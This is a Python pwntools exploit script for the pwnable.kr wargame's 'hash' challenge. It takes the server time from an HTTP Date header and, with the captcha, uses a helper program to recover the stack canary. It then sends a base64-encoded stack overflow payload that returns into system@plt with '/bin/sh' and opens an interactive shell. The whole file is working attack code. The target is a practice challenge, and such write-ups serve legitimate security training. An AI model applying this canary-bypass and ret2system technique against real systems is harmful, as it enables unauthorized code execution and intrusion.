import subprocess
from pwn import *
from datetime import datetime

conn  = remote("pwnable.kr", 9002)
connWeb = remote("pwnable.kr",80)


print "[+]Qeury time to webserver"
connWeb.send("GET / HTTP/1.1 \r\n\r\n")

date = connWeb.recvline_startswith("Date")
date = date.split(",")[1].strip()
date = datetime.strptime(date,"%d %b %Y %H:%M:%S GMT")
print "[+] date:" + str(date)

t = int((date-datetime.utcfromtimestamp(0)).total_seconds() )
print t

data = conn.recvline_startswith("Are")
Captcha = data.split(":")[1].strip()
conn.sendline(Captcha)
print "[+]got a Captcha:"+Captcha
print "[+]Calculate Canary"
cmd = []
cmd.append("./calCanary")
cmd.append(str(t))
cmd.append(Captcha)

print "./calCanary "+str(t)+" "+Captcha

canary = int(subprocess.check_output(cmd),16)
print "[+] Canary value :" + str(canary)


elf = ELF('./hash')
plt_system = elf.plt['system']

payload = "A"*512 + p32(canary) + "B"*12 + p32(plt_system) +p32(0x8048a00) +  p32(0x0804B0E0 + 540*4/3)
payload = b64e(payload)
conn.sendline(payload+"/bin/sh\00")

conn.interactive()

